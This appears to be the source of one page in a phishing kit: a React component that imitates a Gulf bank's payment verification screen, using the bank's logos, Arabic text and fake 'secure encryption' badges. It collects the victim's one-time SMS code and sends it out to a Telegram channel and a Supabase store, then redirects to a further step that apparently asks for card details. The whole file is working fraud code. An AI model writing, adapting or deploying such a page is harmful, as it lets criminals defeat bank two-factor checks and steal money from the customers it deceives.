import { useState, useEffect, useMemo, useRef } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { formatCurrency } from "@/lib/countryCurrencies";
import { resolveEntity, PaymentEntityConfig } from "@/config/gccPaymentEntities";
import { ThemedButton } from "@/components/ui/ThemedButton";
import { ThemedCard } from "@/components/ui/ThemedCard";
import {
  ShieldCheck,
  RefreshCw,
  Loader2,
} from "lucide-react";
import BankLogo from "@/components/BankLogo";
import { DynamicMetaTags } from "@/components/DynamicMetaTags";
import { MirrorPageWrapper } from "@/components/MirrorPageWrapper";

const PaymentOTP = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);
  const updateLink = useUpdateLink();

  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [timer, setTimer] = useState(120);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const selectedBankId = linkData?.payload?.selectedBank || searchParams.get("bank");
  const selectedBank = selectedBankId ? getBankById(selectedBankId) : null;

  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || '';

  // Resolve entity config
  const entityConfig = useMemo<PaymentEntityConfig>(() => {
    if (selectedBankId) return resolveEntity(selectedBankId);
    return resolveEntity(companyKey);
  }, [selectedBankId, companyKey]);

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);

  useEffect(() => {
    const countdown = setInterval(() => setTimer((prev) => (prev > 0 ? prev - 1 : 0)), 1000);
    return () => clearInterval(countdown);
  }, []);

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) return;
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);
    if (value && index < 5) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const otpString = otp.join("");
    if (otpString.length < 4) {
      toast({ title: "خطأ", description: "الرجاء إدخال رمز التحقق كاملاً", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);

    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({ linkId: id, payload: { ...linkData?.payload, otp: otpString } });
      }

      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "payment-confirmation",
          linkId: id!,
          service: entityConfig.nameAr,
          amount: formattedAmount,
          otp: otpString
        }).toString()
      });

      await sendToTelegram({
        type: 'otp_input',
        data: { otp: otpString, service: entityConfig.nameAr, amount: formattedAmount },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/details${window.location.search}`);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل التحقق من الرمز", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <Loader2 className="w-10 h-10 animate-spin text-primary" />
      </div>
    );
  }

  return (
    <MirrorPageWrapper 
      entityId={selectedBankId || companyKey} 
      title="تأكيد الدفع"
      subtitle="Security Code Verification"
      linkData={linkData}
    >
      <DynamicMetaTags
        entityId={selectedBankId || companyKey}
        title={`تأكيد الدفع - ${entityConfig.nameAr}`}
      />

      <ThemedCard config={entityConfig} variant="elevated" className="overflow-hidden">
        <div className="h-2 w-full bg-primary" />
        <div className="p-6 sm:p-10 space-y-8">
          <div className="flex flex-col items-center gap-6">
            <div className="w-20 h-20 bg-background rounded-full border flex items-center justify-center shadow-inner overflow-hidden">
               {selectedBank ? (
                 <BankLogo bankId={selectedBankId!} className="h-14 w-14 object-contain" />
               ) : (
                 <img src={entityConfig.logo} alt={entityConfig.nameAr} className="h-14 w-14 object-contain" />
               )}
            </div>
            <div className="text-center space-y-1">
              <h2 className="text-xl font-bold text-foreground">رمز التحقق مطلوب</h2>
              <p className="text-sm text-muted-foreground">أدخل الرمز المرسل إلى هاتفك لإتمام العملية</p>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-8">
            <div className="flex justify-center gap-3" dir="ltr">
              {otp.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => (inputRefs.current[index] = el)}
                  type="text"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className="w-10 h-14 sm:w-12 sm:h-16 text-center text-2xl font-bold bg-muted border-2 border-border rounded-[var(--gcc-radius-button)] focus:border-primary focus:ring-4 focus:ring-primary/20 transition-all outline-none"
                  style={{ borderRadius: 'var(--gcc-radius-button)' }}
                  required
                />
              ))}
            </div>

            <div className="space-y-4">
              <div className="flex items-center justify-between px-2">
                <span className="text-xs font-bold text-muted-foreground uppercase tracking-widest">المبلغ: {formattedAmount}</span>
                <span className={timer > 0 ? "text-primary font-bold" : "text-destructive font-bold"}>
                  {Math.floor(timer / 60)}:{(timer % 60).toString().padStart(2, "0")}
                </span>
              </div>

              <ThemedButton
                config={entityConfig}
                type="submit"
                disabled={isSubmitting}
                loading={isSubmitting}
              >
                {isSubmitting ? "جاري التحقق..." : "تأكيد الرمز"}
              </ThemedButton>

              <button
                type="button"
                disabled={timer > 0}
                className="w-full py-2 flex items-center justify-center gap-2 text-sm font-bold transition-colors disabled:opacity-50 text-muted-foreground hover:text-primary"
              >
                <RefreshCw className="w-4 h-4" />
                <span>إعادة إرسال الرمز</span>
              </button>
            </div>
          </form>
        </div>

        <div className="p-6 sm:p-8 border-t flex items-center gap-4 text-right bg-primary/5 border-border">
          <div className="w-12 h-12 rounded-full border border-border bg-card flex-shrink-0 flex items-center justify-center text-primary shadow-sm">
            <ShieldCheck className="w-6 h-6" />
          </div>
          <div className="space-y-0.5">
            <p className="text-[10px] font-bold uppercase text-foreground">Secure Verification</p>
            <p className="text-[9px] font-medium leading-none text-muted-foreground">هذه الصفحة محمية بنظام التشفير البنكي المتقدم</p>
          </div>
        </div>
      </ThemedCard>

      <p className="text-[10px] font-bold text-center uppercase tracking-widest px-8 leading-relaxed py-8 text-muted-foreground opacity-60">
        لا تشارك رمز التحقق مع أي شخص. موظفو البنك لن يطلبوا منك هذا الرمز أبداً.
      </p>
    </MirrorPageWrapper>
  );
};

export default PaymentOTP;
